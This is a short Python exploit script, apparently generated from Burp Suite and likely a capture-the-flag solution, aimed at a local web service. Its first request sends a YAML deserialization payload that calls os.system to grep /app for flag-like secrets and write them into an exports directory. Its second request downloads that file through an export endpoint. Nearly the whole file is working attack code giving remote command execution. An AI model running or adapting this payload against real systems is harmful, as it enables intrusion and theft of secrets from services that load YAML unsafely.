import requests

burp0_url = "http://localhost:8888/api/mission"
burp0_cookies = {"csrftoken": "2iFUYGWRybgGAbHpUskB5dXYoUHrS4L4"}
burp0_headers = {
    "sec-ch-ua-platform": '"Linux"',
    "Accept-Language": "en-US,en;q=0.9",
    "sec-ch-ua": '"Chromium";v="133", "Not(A:Brand";v="99"',
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
    "sec-ch-ua-mobile": "?0",
    "Accept": "*/*",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "http://localhost:8080/",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive",
}
# burp0 data изначально какой-то кал подставился, хз зачем это
burp0_data = """!!python/object/apply:os.system ['grep -E "[A-Z0-9]{31}=" -r /app 2>&1>/app/stores/autopilot/exports/rasput.file']"""
requests.post(
    burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data
)


burp0_url = "http://localhost:8888/api/route/export?path=rasput.file"
burp0_cookies = {"csrftoken": "2iFUYGWRybgGAbHpUskB5dXYoUHrS4L4"}
burp0_headers = {
    "sec-ch-ua-platform": '"Linux"',
    "Accept-Language": "en-US,en;q=0.9",
    "sec-ch-ua": '"Chromium";v="133", "Not(A:Brand";v="99"',
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
    "sec-ch-ua-mobile": "?0",
    "Accept": "*/*",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "http://localhost:8080/",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive",
}
print(
    requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies).text
)
